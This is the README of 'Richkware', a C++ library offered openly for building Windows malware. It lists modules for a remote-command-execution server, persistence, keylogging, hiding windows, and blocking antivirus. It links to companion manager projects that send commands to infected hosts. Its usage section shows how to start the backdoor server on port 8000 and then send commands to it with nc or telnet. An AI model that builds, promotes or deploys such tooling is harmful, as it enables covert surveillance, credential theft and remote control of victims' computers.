# Richkware

Framework for building Windows malware, written in C++.

## Description

It's a library of network and OS functions, that you can use to create malware.
The composition of these functions permits the application 
to assume behaviors referable to the following types of malware:

- Virus
- Worms
- Bot
- Spyware
- Keylogger
- Scareware

## Related Projects

[Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server): Service for management of hosts where is present a malware developped using **Richkware** framework.

[Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client): Client of **Richkware-Manager-Server**, that obtains list of all hosts and is able to send commands to do at each of them.

![](http://richk.altervista.org/RichkwareDiagram.svg)

## Functions

### Network

- **Server** (*network.h*): module for the managment of a multi-thread server, that allow to receive commands from Internet([Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client) or console) according to the specific protocol.
    - **Protocol** (*protocol.h*):
        1. **Remotely command execution** (ID 1)
        2. (work in progress)
- **Network** (*network.h*):
    - **RawRequest**: send a request to a server;
    - **UploadInfoToRichkwareManagerServer**: send information to [Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)

### System

- **Storage** (*storage.h*):
    - **SaveSession** and **LoadSession**: save the application state(encrypted) to:
        - **Register** (SaveValueReg and LoadValueReg)
        - **File** (SaveValueToFile and LoadValueFromFile)
    - **Persistance**: install itself permanently in the system.
- **IsAdmin** and **RequestAdminPrivileges** (*richkware.h*): check and require administrator privileges;

- **StealthWindow** (*richkware.h*): hide applications;
- **OpenApp** (*richkware.h*): open arbitrary applications;
- **Keylogger** (*richkware.h*): stores in a file all pressed keys;
 - **BlockApps** e **UnBlockApps** (*blockApps.h*): block and unblock applications (antivirus, ...).

### Cryptography

- **Encrypt and Decrypt** (*crypto.h*): [Blowfish](https://en.wikipedia.org/wiki/Blowfish_(cipher))
- **Encode and Decode** (*crypto.h*): [Base64](https://en.wikipedia.org/wiki/Base64).

### Other

- **RandMouse** (*richkware.h*): move randomly the mouse cursor;
- **Hibernation** (*richkware.h*): hibernate system.

## Compile

After **main.cpp** implementation, you can compile as follows.

### Using MinGW for Windows or MinGW cross compiler for Linux build environment

	make

### Using Microsoft C++ compiler (Visual Studio)
- C/C++ > Preprocessor > Preprocessor Definitions, add "\_CRT\_SECURE\_NO\_WARNINGS" 
- Linker > Input > Additional Dependencies, add "Ws2_32.lib"


## Examples of usage

### Remotely command execution

Call function **StartServer** in the main, it starts server on port 8000.

	int main () {
	    ...
		richkware.network.server.Start("8000");
        ...
	}

### Connect from Unix systems

In Unix systems, you can use **netcat**.

	nc <serverName> 8000
	
after the answer from the server about establishment of connection, write:
    
    [[1]]COMMAND
    
where COMMAND is the command to execute to the pc where server is running.

### Connect from Windows

In Windows, you can use **telnet**.

	telnet <serverName> 8000

after the answer from the server about establishment of connection, write:
    
    [[1]]COMMAND
    
where COMMAND is the command to execute to the pc where server is running.
